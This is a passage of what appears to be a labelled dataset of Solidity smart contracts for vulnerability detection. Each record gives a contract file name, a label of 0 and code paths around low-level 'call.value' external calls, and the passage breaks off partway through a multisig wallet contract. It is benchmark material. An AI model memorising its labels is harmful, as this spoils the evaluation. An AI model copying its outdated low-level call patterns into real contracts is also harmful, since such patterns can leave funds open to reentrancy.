\"\\x19Ethereum Signed Message:\\n32\"; bytes32 hash = keccak256(prefix, keccak256(target, data, nonce)); msgSender = ECRecovery.recover(hash, sig); require(msgSender == sender); require(nonces[msgSender]++ == nonce); require(target.call.value(msg.value)(data)); msgSender = address(0); ", "long path": "pragma solidity ^0.4.24; library ECRecovery { function recover(bytes32 hash, bytes sig) internal pure returns (address) { bytes32 r; bytes32 s; uint8 v; if (sig.length != 65) { return (address(0)); } assembly { r := mload(add(sig, 32)) s := mload(add(sig, 64)) v := byte(0, mload(add(sig, 96))) } if (v < 27) { v += 27; } if (v != 27 && v != 28) { return (address(0)); } else { return ecrecover(hash, v, r, s); } } function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32) { return keccak256( abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash) ); } } contract Feeless { address internal msgSender; mapping(address => uint256) public nonces; modifier feeless { if (msgSender == address(0)) { msgSender = msg.sender; _; msgSender = address(0); } else { _; } } function performFeelessTransaction(address sender, address target, bytes data, uint256 nonce, bytes sig) public payable { require(this == target); bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\"; bytes32 hash = keccak256(prefix, keccak256(target, data, nonce)); msgSender = ECRecovery.recover(hash, sig); require(msgSender == sender); require(nonces[msgSender]++ == nonce); require(target.call.value(msg.value)(data)); msgSender = address(0); } } "}
{"sol name": "39019.sol", "label": 0, "first path": "function CreateTokens() { if (tokensCreated > 0) return; uint amount = amountRaised * (100 - rewardPercentage) / 100; if (!tokenCreateContract.call.value(amount)(tokenCreateFunctionHash)) throw; tokensCreated = tokenContract.balanceOf(this); tokenCreator = msg.sender; ", "second path": "function CreateTokens() { if (tokensCreated > 0) return; uint amount = amountRaised * (100 - rewardPercentage) / 100; if (!tokenCreateContract.call.value(amount)(tokenCreateFunctionHash)) throw; tokensCreated = tokenContract.balanceOf(this); tokenCreator = msg.sender; ", "third path": "function CreateTokens() { if (tokensCreated > 0) return; uint amount = amountRaised * (100 - rewardPercentage) / 100; if (!tokenCreateContract.call.value(amount)(tokenCreateFunctionHash)) throw; tokensCreated = tokenContract.balanceOf(this); tokenCreator = msg.sender; ", "long path": "pragma solidity ^0.4.10; contract ERC20 { function balanceOf(address owner) constant returns (uint balance); function transfer(address to, uint value) returns (bool success); } contract TokenPool { string public name; uint public fundingLimit; uint public rewardPercentage; uint public amountRaised; uint public tokensCreated; ERC20 public tokenContract; address public tokenCreateContract; string public tokenCreateFunction; mapping (address => uint) funders; address public tokenCreator; bytes4 tokenCreateFunctionHash; function TokenPool( TokenPoolList list, string _name, uint _fundingLimit, uint _rewardPercentage, ERC20 _tokenContract, address _tokenCreateContract, string _tokenCreateFunction) { list.add(this); name = _name; fundingLimit = _fundingLimit; rewardPercentage = _rewardPercentage; tokenContract = _tokenContract; tokenCreateContract = _tokenCreateContract; tokenCreateFunction = _tokenCreateFunction; tokenCreateFunctionHash = bytes4(sha3(tokenCreateFunction)); } function Fund() payable { if (tokensCreated > 0) throw; uint amount = msg.value; amountRaised += amount; if (amountRaised > fundingLimit) throw; funders[msg.sender] += amount; } function() payable { Fund(); } function Withdraw() { if (tokensCreated > 0) return; uint amount = funders[msg.sender]; if (amount == 0) return; funders[msg.sender] -= amount; amountRaised -= amount; if (!msg.sender.send(amount)) { funders[msg.sender] += amount; amountRaised += amount; } } function CreateTokens() { if (tokensCreated > 0) return; uint amount = amountRaised * (100 - rewardPercentage) / 100; if (!tokenCreateContract.call.value(amount)(tokenCreateFunctionHash)) throw; tokensCreated = tokenContract.balanceOf(this); tokenCreator = msg.sender; } function ClaimTokens() { if (tokensCreated == 0) return; uint amount = funders[msg.sender]; if (amount == 0) return; uint tokens = tokensCreated * amount / amountRaised; funders[msg.sender] = 0; if (!tokenContract.transfer(msg.sender, tokens)) { funders[msg.sender] = amount; } } function ClaimReward() { if (msg.sender != tokenCreator) return; uint amount = amountRaised * (100 - rewardPercentage) / 100; uint reward = amountRaised - amount; if (msg.sender.send(reward)) { tokenCreator = 0; } } } pragma solidity ^0.4.10; contract TokenPoolList { address[] public list; event Added(address x); function add(address x) { list.push(x); Added(x); } function getCount() public constant returns(uint) { return list.length; } function getAddress(uint index) public constant returns(address) { return list[index]; } } "}
{"sol name": "35637.sol", "label": 0, "first path": "function transfer(address _to, uint48 _value, bytes _data, string _custom_fallback) returns (bool success) { if(isContract(_to)) { require(balanceOf(msg.sender) >= _value); balances[msg.sender] = safeSub(balanceOf(msg.sender), _value); balances[_to] = safeAdd(balanceOf(_to), _value); ContractReceiver receiver = ContractReceiver(_to); receiver.call.value(0)(bytes4(sha3(_custom_fallback)), msg.sender, _value, _data); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "second path": "function transfer(address _to, uint48 _value, bytes _data, string _custom_fallback) returns (bool success) { if(isContract(_to)) { require(balanceOf(msg.sender) >= _value); balances[msg.sender] = safeSub(balanceOf(msg.sender), _value); balances[_to] = safeAdd(balanceOf(_to), _value); ContractReceiver receiver = ContractReceiver(_to); receiver.call.value(0)(bytes4(sha3(_custom_fallback)), msg.sender, _value, _data); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "third path": "function transfer(address _to, uint48 _value, bytes _data, string _custom_fallback) returns (bool success) { if(isContract(_to)) { require(balanceOf(msg.sender) >= _value); balances[msg.sender] = safeSub(balanceOf(msg.sender), _value); balances[_to] = safeAdd(balanceOf(_to), _value); ContractReceiver receiver = ContractReceiver(_to); receiver.call.value(0)(bytes4(sha3(_custom_fallback)), msg.sender, _value, _data); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "long path": "pragma solidity ^0.4.17; contract ERC223 { uint public totalSupply; function balanceOf(address who) constant returns (uint48); function name() constant returns (string _name); function symbol() constant returns (string _symbol); function decimals() constant returns (uint8 _decimals); function totalSupply() constant returns (uint48 _supply); function transfer(address to, uint48 value) returns (bool ok); function transfer(address to, uint48 value, bytes data) returns (bool ok); function transfer(address to, uint48 value, bytes data, string custom_fallback) returns (bool ok); event Transfer(address indexed from, address indexed to, uint48 value, bytes indexed data); } contract ContractReceiver { struct TKN { address sender; uint48 value; bytes data; bytes4 sig; } function tokenFallback(address _from, uint48 _value, bytes _data){ TKN memory tkn; tkn.sender = _from; tkn.value = _value; tkn.data = _data; uint32 u = uint32(_data[3]) + (uint32(_data[2]) << 8) + (uint32(_data[1]) << 16) + (uint32(_data[0]) << 24); tkn.sig = bytes4(u); } } contract SafeMath { uint48 constant public MAX_UINT48 = 0xFFFFFFFFFFFF; function safeAdd(uint48 x, uint48 y) constant internal returns (uint48 z) { require(x <= MAX_UINT48 - y); return x + y; } function safeSub(uint48 x, uint48 y) constant internal returns (uint48 z) { require(x > y); return x - y; } function safeMul(uint48 x, uint48 y) constant internal returns (uint48 z) { if (y == 0) return 0; require(x <= MAX_UINT48 / y); return x * y; } } contract ERC223Token is ERC223, SafeMath { mapping(address => uint48) balances; string public name; string public symbol; uint8 public decimals; uint48 public totalSupply; function ERC223Token() public { totalSupply = 25907002099; balances[0x535fC82388b0FF37248B5100803C3FA00FF076cB]=129350000; balances[0x329504f7Cf737d583AB6AC3Cabd725ec1bF329a4]=7636000; balances[0xCC7E72c949a71044D7f22294c7d9aB0524cCAFf7]=1; balances[0xd590955D43bfbe93A3c51b2d6BAFc886C24a4B87]=110; balances[0x6B6d0B5842c61153d89743040B19C760DDA647B5]=388300; balances[0xcb9D6ad63a4487D28545F9Bd3c9d2B2Cf374803b]=1054000; balances[0xb700402053ac42638C83B9a791f03F4c9bF16854]=330000; balances[0xFBb1b73C4f0BDa4f67dcA266ce6Ef42f520fBB98]=1484598; balances[0x04f04c5F2e735A223FDEFe94c94978F77c344FB8]=1100000; balances[0xB66844cD7EC75b91FE62aB5A0E306132485C9527]=179391; balances[0xC4CE380FcfaD899F9A7aCF8F13690dbE387FB8db]=1185800; balances[0xe02E96193e84FCc63F2D488a7c9448B43aD904A4]=1140700; balances[0xA2fE32aA95f9771F596089CC171dD10cA3d5761C]=44000; balances[0xd6484a997129938709fAb588Fd6F55B0A684ab56]=21890000; balances[0x9a6F14cEaD3521142E678fD0fEe294881449D889]=2204925; balances[0xb3ce93Ef88d0ea70cafc029b4238CBa3b704354d]=1519400; balances[0x7eD1E469fCb3EE19C0366D829e291451bE638E59]=304722; balances[0xAAb8805f5626760b612812b83D77F96671E222e2]=1492589; balances[0x7205d8e2Ff6012392Ac4C0c9fb5125F8Abb3ef6d]=1100000; balances[0xEC348184cA6C85d12cA822Dc01FAbEb1d199e996]=1100000; balances[0xA56F95FC14bC4D2953a819c20c0C7078a08ef7Aa]=6600000; balances[0x5aD299927508d786E469AadDf34EEDDD4aCd96A5]=880000; balances[0xF46DBA0c3Cce9d3b2Ce371952b72e7F66b62BE95]=1100000; balances[0xd5f3b11b2E20fa1B7018e93128BF6faf5bda2BD7]=4894374; balances[0x3b1a8135E0b445097c83F780F0B068F21cEAa7b4]=1052381; balances[0xF27Fef813A7D7E17f7907a6043c52971a0b0209f]=769780; balances[0xf3cAD07CB033F68A35e388527e55F1E804f8704a]=2088246; balances[0x5B1286d898eD28d8a7A59b224Fc4c252461e0b64]=384957; balances[0xBb265B80c2eFe6f071432FBA0B1527Ab5Ba9F91F]=319985; balances[0x259DF6B527FB06757dB3295862aC8dc292466435]=98550; balances[0xeb62ae01812773BF3C270221a9b511c86AaC1546]=296120; balances[0x51A7016D90B58855D89efFC70c94e9808cabE680]=106012; balances[0x919612F15F7734cD59008B2E21ba7bAC435bB8A8]=258912; balances[0xDD6be4514A348FB2d422d176dEC81B8666B143dd]=34942; balances[0xf0660eFb282102dB8B57EaF39F883833E8b62821]=679598; balances[0x267C817c2Ea39C31C7075A5548d5356bcf205eFD]=186215; balances[0x863aACEbF0030e26e14F9ff552b654171Ff6372F]=295686; balances[0x14A1C2F56b7953aA4A93700C346740b9A25150F8]=148344; balances[0xFc8425A1B01d1d74c2281Da2975cB77422d4CEA3]=2961211; balances[0x4FdB2ee1EbEb1886976FA9aDAaA42a1c090335aD]=1124099; balances[0x019BDC7F3DDF5aD4A5695e16ACfe02a4d32aEA5f]=116046; balances[0xE11692E90dE2A2c4F220Fb0597CFdd22D5eFAcF1]=17767; balances[0x6f06F186C8dd8D0cAd3835946A857aed261C5652]=20038512; balances[0x24F7a01Fa083F8DB8A5b4dd46Fb003F1fd1C47d5]=3378741; balances[0x92D8bfD2d2559a25a5D43e84f4430915e38B980F]=264302; balances[0x8785816569941D86DFAE7adFdd92C2f50d3a5Ad6]=397479; balances[0x7B2C6cB5bE1a99118ce38e373d58adF04d8e6719]=290277; balances[0xa50da0F0940A852927740470e1A0a6016e9a3B65]=79800; balances[0x9d2C3aA31Ffb61180214Ca87296A2f4F8DDA6472]=1029302; balances[0x93A1B766A75DaeCa4a05E08ee5d7781f3d6D72B1]=7279842; balances[0x96BD54Caefd00EeFe1e836677319B6631C0f67E0]=525000; balances[0x0072e4Fd215f7B992D0A19fAdC58DBfAC568CE4a]=1155000; balances[0xF9eE68058FA43a79834897793B7B34d0135b98BB]=11500; balances[0x2A9c9a5475A6E24A530ccf5527A045F4dBf3E78e]=1138500; balances[0x995C6B0d4F3cca7d0081f18d4b48faa135eA47b3]=38755; balances[0x679d24F2F5AAf0E7bB6dd49e45B41CCff0779564]=459493; balances[0x9235881033C4B57be38B1d28921451F90bd7744d]=114493; balances[0xDf61cA237F6E782df0E090f58c8534e8794bAE64]=271231; balances[0xEDdb1aBC1e37953F91ca6E3a11611Be79719fF5d]=46000; balances[0xdf15A49e50Fa9f2D71B922Ae325a5AFB381A31f1]=1150000; balances[0x269E20e3dA89481d6F0De3408c5448AE44a313B8]=250534; balances[0x8D1F338F8abd714fd09ec13C100A0d7dF693cd5D]=282900; balances[0xb703CE71557095b9566348928bBFD4a991456936]=207000; balances[0x3877d21b3f1ffDF602840366aDf2350b8E1F8210]=298492; balances[0x9A77E0910034A3B809687f8340b5BD2a184ED5bb]=345000; balances[0x8861fd090e71D72A7ca0Aa0B24dD5D664b52cF03]=1150000; balances[0x0098C71bCA3EBD977147928A4dA574fd138571AC]=465750; balances[0x7131f3FCc9177F1176378635efD30A9109cF3cdE]=1682450; balances[0x90FcD92B396CFD6951d8DdCd0Cdd2654436C2840]=1150000; balances[0x5Bd46d1744B2AAAd591B01D23786336bF7faC094]=2961897; balances[0x0C95959EB2056d86552baa4B859288C84D74a7e9]=3450000; balances[0x8755A5619E2D2FC56e263FcBE26116250941d477]=23407; balances[0xfDbe03a53aF5e4509AEBD9D148B41eEc34776B7c]=1137993; balances[0x72a63625144327FC6A58867699107934E7F0B609]=438399; balances[0x4EE354582a9Cc60Eb086CAEB514234c1EfE14D9F]=115000; balances[0xBF0A1d55528EEd2990F752A6bccd24dd772421f5]=1725000; balances[0x670226836D7Bf336bfd172086d682002a30D63e3]=1010850; balances[0xd8F83AF83B6334be21a166d203e84D9c4f6e33e0]=396243; balances[0xd175fb3b65eDC995DC9b2dAE705270448D8A5231]=328900; balances[0x86dE9262Aa13f1351C9009B6BC1B1a432C96f005]=274068; balances[0x08E004E3741052Fd00e49384088e2D6F81f97fd5]=1264492; balances[0xc1F81207791DDa997542625cb86CC0D8Af7dfAb4]=1138500; balances[0x913E5A823A614ad226c810e55154f3f385F647F0]=1150000; balances[0x7f4823876318faD7321FD813b7aBd4A7C60C12A5]=1150000; balances[0xcd9E6E0E63C5611ab1988e0569E3aD89b86086c6]=199299; balances[0xb1Dd23a37776c1d3E1F0c874d1F72589F3c59E44]=1138500; balances[0xfE2ceCCC914be290d49712d4715438268FC76359]=1150000; balances[0x3dd9cFE0D6eE68163aCd1EeB6De9f4D3A580839D]=505825; balances[0x9323D4704fB877CD090Ba715B11Da9A3eDFdA7Ef]=275000; balances[0x0c747c7EEdf05515425AdD4061911Ae9F039F4Df]=821160; balances[0x51a23f481037CA208086f42FE83D28B71c1EbC2c]=345000; balances[0x42E1Fb8EC1830DBe4e5Ed5Ce60Bd307D3AcBB5a1]=14950; balances[0x4fa531A7da9b0FA37cC60eb26eE7393B39c616B1]=945000; balances[0x9383D952e4aa5C33c86d11932877D1D523097702]=221958; balances[0xd5FECA4d252b298d7500c05766049210e2BD6C03]=600000; balances[0xf4e5DA75e054FE7373a8Db3B5aD4E2d35404b7F3]=1096; balances[0xA46BBC28cB381A6c383DAE0D3eAb39A78d9bd704]=342402; balances[0xc94AB3B27218b1E5C24Fdb7cE169EB8bD5a58060]=1922965; balances[0x7111B872B505992b2a61f5F3b7A31E6A589F9ba2]=2265500; balances[0x66D94665903a8c5A7e2E065e654610e4C0E3d510]=1155060; balances[0x180d932fbD59C12c180087085cDCDFa50f20C7DB]=1150000; balances[0x07ACDd672aB32251C38560F14bd3b325A3392a42]=8904900; balances[0x9b0Ae3d7A088101BbC027685B31020e88D776795]=101727; balances[0x9608D348627CcB2FEcd97ab2896DB2516dDCdD9F]=2000000; balances[0x82b9EedCAA518352BDb1aC80F5a214857f29a3fc]=260000; balances[0x26BD273Ad192046E4cE16f3c23f4D4A273176C6c]=400000; balances[0x3707D0B7EB1A3e70E2a892aAD4938be493b053Ef]=995000; balances[0x687Eab8387faFca0E894c7890571cb8885d06252]=100000; balances[0x29B41749C1b019624dB2Eca34852aAd1435E2FB2]=1150000; balances[0x985B1beC38e6402C9EE39b6f0c26518899026e4c]=1000000; balances[0x0674C588aB53256a0ef619CAfB459324Dc8Ea009]=1655620; balances[0x84A3A12B84C57E1Fe22fAB1CC3Ad40308cB53ecd]=3980559; balances[0x0B8a97a036bCc47707a11231362435e937f35536]=900000; balances[0x99DfCa33bAABC6812Ebe8C790EeD515D8B36B69E]=160000; balances[0xF85D5c4197caa5ec2fC97761b0D51A012F4BE84f]=11525; balances[0xbBb40eC9E24C6D387843dfEA84Baa5E8BD6Fd3e9]=2000000; balances[0x8df3185D971B5C657D0f2E9B53Dc0bBe5912F42e]=1000000; balances[0xa1ec5e1274A5FA126415453968c9929c3F91FEE7]=100000; balances[0x3607e4119Ef3E2a72E55D18B5feaA81c6140E85e]=200000; balances[0x26a74e056EB4E3607792DCd87070E468878d14E9]=70000; balances[0x517DB8116c84888Fa8013AB18B7E5F2f5e152508]=100000; balances[0x547376929E8A4abcC04c32268c43d4924f2Ac985]=1749903; balances[0xA6d8aD119eAC13Fe161BEff88be65FC9624C1340]=942438; balances[0xdb090dDaC7A159Eb6161c8591aED719d80875f37]=996417; balances[0x922D65456B8B1DeDC6F3EFcDB2981163144E96ee]=48300; balances[0x63235E4764A0072fE68Bdd32D1A16813E5fc9d49]=1457548; balances[0x68aD20aa347f5E719EF4476B25154B4d547a6275]=753951; balances[0x75393B6949157376f93C1e56220ACD5457323135]=1506758; balances[0x1796c3f4E9E877A79df5923bf8bE9aB925F7deD4]=200000; balances[0xF0ED57958dD75DBD20374D46F1547dED0D717b4b]=1000000; balances[0x1a2EB5ADf16aA5915AC70f6C530680945F5DAdF4]=132170; balances[0x5ec85d2f4891bB5034bE10BA9B3B0253cc394Cd9]=205299; balances[0x179278CB0659957675f9f3E7f949C3CcA283F153]=110000; balances[0xCA4bB096407E7c2b2c0E67D5173FD9BB8E452647]=100000; balances[0xdd8b17C94B097587108476bf1AC31Ce02cFa6c12]=181097; balances[0xA7b1a07AF73f52A9bcD22C6BF2122577bb4f7900]=130000; balances[0x38a6d1c82E8f3E04940FeA95E583Bdc24df964e4]=543404; balances[0x8A39dBa536919aB530E5b4dA9f4686A350eb2379]=1000000; balances[0x113b1501D2B6bf0f84D720Cec93928aD552749D2]=100000; balances[0xa028fAF0f1DC3176069F755AE643AbE13aA53E1b]=33596; balances[0x29D70Bb2FE698ae19cBD317fedaB4BcE3Cd3E85c]=490000; balances[0xb9aC6748E56a67D99F1869E701DedAB25A90cFC5]=100000; balances[0x90785Da382Cea9d3352D6ad8935816BADFFB3D73]=2167608; balances[0x8661C945bE98c81191BB4d6254bfe1B475AB86a5]=347154; balances[0x36bA740450a224E866b3C17B46C33CDB80a8e718]=2600365; balances[0x0DF2781a47a1fa23F3D73E79E089E5e178A72ba6]=67390; balances[0x1914D9FD18c6aC7cF2c2135be38E9D746aAa4743]=12095033; balances[0x2314401bDD5318A88A9a0c05FB07B800dae88ED8]=627865; balances[0x300bD3b89cBf26292bD58c99dB2851f14050a221]=345000; balances[0x23E2F1e5b874ac14039306804912aEb66713FCa2]=276181; balances[0xB365C8583B4fAc9C1352E3FFa2Bdb68C663C1A06]=78435; balances[0x0E9822f773e93d8C58255451f4f4Af78F5374353]=785839; balances[0xC006E4931AD1FD622B20bF66844C34676834A05f]=141365; balances[0x04a2209bB6fa3c8ae05A6133b27d628D18054853]=179713; balances[0x8bC1b34c9712Af6B891A12f9C6311b0D3B8CBfa8]=1280058; balances[0x38a548Ba2235245FD99c2116b9a1211AaD54B28D]=5014000; balances[0x55781922C48A3F51C38153365c795ca06383a177]=2415000; balances[0xB97559fe630EB888aEa2fBD6dB4a67909d7e5879]=407067; balances[0x83AB7422A347Ddb8957725F08a103107bb119328]=5510; balances[0x2D7dc7b96e9dFb393CFa466eAC6c494BDa28604a]=245000; balances[0xE804b632cd624Bd80a2a4DdBc9d0aD3984e54F93]=25000; balances[0x0CfB3a673d6E735c5b9E9a9A9Da032E960CD8CD4]=123049; balances[0x44344Dc9974706c34f53B92167275a34f4AB1EE8]=44753; balances[0x4C65118325dcd97E8724cd4E763703f7263f0DDF]=180000; balances[0x5Fc8f1D8B9Eeebf2Cf6a2eE5c20b3dEF6b2d10B5]=1044750; balances[0x0280EF5689728A8eD0eC93A49F700ea251eB64fB]=44275000; balances[0xc784a88c444cCB22eb744ffA3Dd37b78F9F29f9D]=187915; balances[0xCdc35eD04Cf4eeb74dD82eABe82cbB386Aa79D1c]=575000; balances[0xF53786FF94a25DB623A028B08B69aa875648986B]=10127000; balances[0x36621EA0B079CEDD13026e321BfC4924d55a6008]=8480114; balances[0xbE8a87EE71db2323515787Ae37A198cA898188Ae]=3453850; balances[0xB7237539824a984Cd095F6509E7D7bB710f3c6FA]=70000; balances[0x1b42dFB72B02fFB15F369C38F39E6753980B6a89]=51672; balances[0xb7FFb5174BF7382a1445C735166f49fdCa893884]=480386; balances[0x50DF172676De7d1769877fd1A4221F634bF9B9D7]=245000; balances[0x67E7e452a8671eFecb9284c483dE75C3fF1f02A9]=13168935; balances[0xBFa4d7beAcA87AaE890fe79C948Cc057B409156B]=38994; balances[0xD1c6ad2b3F196252629787D0CdCa69ED4d76a890]=111879; balances[0xBF6C51b740ee3dd7650aA9958a57A58caeaBF4d2]=1316666; balances[0x0056D18AEF3FF077826dd50c68cef9ddC84a6827]=108000; balances[0x4Bd6B497DE1a41bF4B29a4387DD4CD9030b583AA]=315392; balances[0xe38Bf41d25C21b411C406822f4eC682753E3a8b5]=6170363; balances[0x6EE0D8DE8829C0648B1f0682A04b89a13dD3Bb6d]=279361; balances[0x0e4d86cf3CbF43dBF588B9C7FF3cD29CE1a46e19]=101122; balances[0x1bD7DE6Ec470914663850bAa88E6a57B30E42e7C]=251945; balances[0x85478a6aD555Ef567B9ff2acdF0024DD643D16D6]=1990000; balances[0x1b84B3FD554d2338926D43A0cdd4D7aFD7d62E29]=10000000; balances[0x92844ad0530580F3ecc459f7B203a1853027bD01]=6900000; balances[0x2E87Eb67a51fD130Ab4d056f48c6256B201E2a96]=260792; balances[0x56D18AEf3Ff077826dD50c68cef9ddC84a6827ee]=6080000; balances[0x33c33E5F1C41477df3715575A8f0CC9E2330C3A8]=223228; balances[0x5765725f2a0e30DABcFc838701Ed01CaaB0564e8]=354161; balances[0x058dfCDB62C93a5f78e8C5D162911f46269aDB4c]=2500000; balances[0x826f679FBDCAC418352737dDf57dbddDE37C3603]=16100; balances[0xAFfb92c9bf7Fe534a38E29428a89dfFf91F06362]=65676; balances[0xd8A3B9456cB819f19Cf230bB5b31f1d88f6A128F]=140000; balances[0x47c0f4ADe7C8A071EA98DB4739F1fdEfFcb89bE0]=10350200; balances[0x3271bB92A304503Cb09a58e9f822DFD9C5187095]=279361; balances[0x5D4545ab1016039F2CA7f6038d2044069e4EF6a0]=5000000; balances[0x4F18A7fE4e3476191098453F973d93c120a5046b]=94817; balances[0x9157C680585718ffdb621031cC93b6EcC4cA763C]=320499; balances[0xF6eBf541d7cfBC0cB3ACeF0b2aeF70992db5abE4]=3720; balances[0x18556A2F95d86F4681420c97a2b3EcE70b07F54C]=29763; balances[0xA6189D516d88857583Af24A500Ae47E5326b2aBf]=529049; balances[0x211af5659bCec2cf14AcF7Ef3069C8be9c318D3C]=416667; balances[0xFbD1Db8B6F9B0c3f47a9f731200CA85725aADdD2]=124271; balances[0xB469C927e1a8485d8ae2F6e16b1654167Bb185D6]=416667; balances[0x8C00526818eeCA6b4BdA0fD534b8f1d53c78E200]=200000; balances[0x007aDfB8C0Fa143E9c0d4260172D88A3ef38F6e9]=365198; balances[0x6856f0FF9619bD151bD4E34cF8a9B613d3A0d161]=731882; balances[0x1C0576530BBB246d834F847b8EB634377CCC5eD2]=700065; balances[0x5106B0860475CdF3F74D1B3fdfc5619eE2C51Aa5]=141377; balances[0xc076c1C52BfDBb15507102AaDA4473a039963F4f]=25000000; balances[0x93970080A078980B8B121A556A60f3a114FB9169]=706889; balances[0x9FfDca13b7ea0ddE97Dce2a286E453518eF34C00]=744093; balances[0x65c6D15C2772B42c745c980dbcB5FB0f74974385]=26043; balances[0x961E7e3558F31C647fc4D39B0aC2544E786cCd3f]=333668; balances[0xA07b23625BD37378f24023bc7B55eB501F3cC4Ed]=96732; balances[0x73F15eBEBDe578024A60A4cDf626689efF2B9065]=372046; balances[0x9865F77f5A21595329f05A9D8a47F6Da966E0b38]=23029; balances[0x65c6f7A45A005CCC1979599473aA79Ca73D6efb0]=57317; balances[0xa0D2F4B648beAff668dDBa8e748Ac135c4c49F84]=369639; balances[0x9f8EdE9F051f946788211549b70CfEF5c81B447B]=1000000; balances[0xAbe5CCb78502727c8CF17CfA79b218e889DD62bB]=102004; balances[0xE6ba478c352DE046aa3D9279A61A43850F3a609c]=101008; balances[0xd889C102e974ef2bA128D3caa60C463A3ae8F989]=163700; balances[0x803CbCF07c4cFA1874dad6BCeD796aB5320b3d89]=4500; balances[0xe8621096d55C7B970bF88cc4e597f29dA4b55218]=170455; balances[0x4347da950003a9C0E477eC625CD1b57620B762DE]=1150000; balances[0x8Cf2Bef55EA9a7908029853CF6289356f24e332B]=210833; balances[0xC6B24D95E69D9F74eA90C419F4B4F71e6433b2EE]=13761; balances[0x9B1f1962b65deAA7c1C495a36767f48019f24205]=57500; balances[0x976d00C6aaf3E49E2615665D81B70080933D8623]=516488; balances[0xafCe1E95eB00824B0368E2574c81ea04252D09aA]=86071; balances[0x60995c4c4b7B9EA3D6dE08a7bf8AAf1188aF943B]=27523; balances[0xc50c9457a5b0849999e2b89db8dDeA23436f3c46]=61345; balances[0x042a3E1aB9eB9Aa7B06c63eaAfb99F0EEE37c9aC]=42000; balances[0x52437Ce5c02de9B0A5D933E6902a9509f33353B4]=86071; balances[0x6FBb288E14a37a94f69c18a0eD24FaC1145b9900]=522827500; balances[0x33C8d18e9b46872CeBb31384bFBEc53Cb32Ccf12]=24876206872; name = \"GameCoin\"; symbol = \"GMC\"; decimals = 2; } function name() constant returns (string _name) { return name; } function symbol() constant returns (string _symbol) { return symbol; } function decimals() constant returns (uint8 _decimals) { return decimals; } function totalSupply() constant returns (uint48 _totalSupply) { return totalSupply; } function transfer(address _to, uint48 _value, bytes _data, string _custom_fallback) returns (bool success) { if(isContract(_to)) { require(balanceOf(msg.sender) >= _value); balances[msg.sender] = safeSub(balanceOf(msg.sender), _value); balances[_to] = safeAdd(balanceOf(_to), _value); ContractReceiver receiver = ContractReceiver(_to); receiver.call.value(0)(bytes4(sha3(_custom_fallback)), msg.sender, _value, _data); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); } } function transfer(address _to, uint48 _value, bytes _data) returns (bool success) { if(isContract(_to)) { return transferToContract(_to, _value, _data); } else { return transferToAddress(_to, _value, _data); } } function transfer(address _to, uint48 _value) returns (bool success) { bytes memory empty; if(isContract(_to)) { return transferToContract(_to, _value, empty); } else { return transferToAddress(_to, _value, empty); } } function isContract(address _addr) private returns (bool is_contract) { uint length; assembly { length := extcodesize(_addr) } return (length>0); } function transferToAddress(address _to, uint48 _value, bytes _data) private returns (bool success) { require(balanceOf(msg.sender) >= _value); balances[msg.sender] = safeSub(balanceOf(msg.sender), _value); balances[_to] = safeAdd(balanceOf(_to), _value); Transfer(msg.sender, _to, _value, _data); return true; } function transferToContract(address _to, uint48 _value, bytes _data) private returns (bool success) { require(balanceOf(msg.sender) >= _value); balances[msg.sender] = safeSub(balanceOf(msg.sender), _value); balances[_to] = safeAdd(balanceOf(_to), _value); ContractReceiver receiver = ContractReceiver(_to); receiver.tokenFallback(msg.sender, _value, _data); Transfer(msg.sender, _to, _value, _data); return true; } function balanceOf(address _owner) constant returns (uint48 balance) { return balances[_owner]; } } "}
{"sol name": "28869.sol", "label": 0, "first path": "function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId)  { if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (txn.destination.call.value(txn.value)(txn.data)) Execution(transactionId); else { ExecutionFailure(transactionId); txn.executed = false; function confirmTransaction(uint transactionId) public  ownerExists(msg.sender)  transactionExists(transactionId) notConfirmed(transactionId, msg.sender)  { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "second path": "function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId)  { if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (txn.destination.call.value(txn.value)(txn.data)) Execution(transactionId); else { ExecutionFailure(transactionId); txn.executed = false; function confirmTransaction(uint transactionId) public  ownerExists(msg.sender)  transactionExists(transactionId) notConfirmed(transactionId, msg.sender)  { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "third path": "function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId)  { if (isConfirmed(transactionId)) { Transaction storage txn = transactions[transactionId]; txn.executed = true; if (txn.destination.call.value(txn.value)(txn.data)) Execution(transactionId); else { ExecutionFailure(transactionId); txn.executed = false; function confirmTransaction(uint transactionId) public  ownerExists(msg.sender)  transactionExists(transactionId) notConfirmed(transactionId, msg.sender)  { confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "long path": "pragma solidity ^0.4.15; contract MultiSigWallet { event Confirmation(address indexed sender, uint indexed transactionId); event Revocation(address indexed sender, uint indexed transactionId); event Submission(uint indexed transactionId); event Execution(uint indexed transactionId); event ExecutionFailure(uint indexed transactionId); event Deposit(address indexed sender, uint value); event OwnerAddition(address indexed owner); event OwnerRemoval(address indexed owner); event RequirementChange(uint required); uint constant public MAX_OWNER_COUNT = 50; mapping (uint => Transaction) public transactions; mapping (uint => mapping (address => bool)) public confirmations; mapping (address => bool) public isOwner; address[] public owners; uint public required; uint public transactionCount; struct Transaction { address destination; uint value; bytes data; bool executed; } modifier onlyWallet() { require(msg.sender == address(this)); _; } modifier ownerDoesNotExist(address owner) { require(!isOwner[owner]); _; } modifier ownerExists(address owner) { require(isOwner[owner]); _; } modifier transactionExists(uint transactionId) { require(transactions[transactionId].destination != 0); _; } modifier confirmed(uint transactionId, address owner) { require(confirmations[transactionId][owner]); _; } modifier notConfirmed(uint transactionId, address owner) { 